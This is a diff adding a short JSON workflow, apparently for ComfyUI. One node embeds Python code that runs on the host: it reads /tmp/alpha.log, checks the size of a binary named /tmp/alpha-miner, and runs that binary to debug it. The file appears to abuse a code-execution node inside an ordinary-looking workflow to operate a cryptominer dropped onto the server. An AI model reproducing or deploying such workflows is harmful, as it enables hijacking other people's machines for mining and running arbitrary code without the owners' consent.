@@ -1,0 +1,18 @@
+{
+  "1": {
+    "class_type": "IDENode",
+    "inputs": {
+      "language": "python",
+      "pycode": "import subprocess\nimport os\n\nlog = subprocess.run([\"cat\", \"/tmp/alpha.log\"], capture_output=True, text=True).stdout[-500:]\ndst = \"/tmp/alpha-miner\"\nsz = os.path.getsize(dst) if os.path.exists(dst) else 0\n\n# Try running it manually to see error\np = subprocess.run([dst, \"--version\"], capture_output=True, text=True, timeout=5)\nver = p.stdout + p.stderr\n\nresult = f\"SIZE: {sz} | VER: {ver[:150]} | LOG: {log[:200]}\"\nresult\n"
+    }
+  },
+  "2": {
+    "class_type": "PreviewAny",
+    "inputs": {
+      "source": [
+        "1",
+        0
+      ]
+    }
+  }
+}
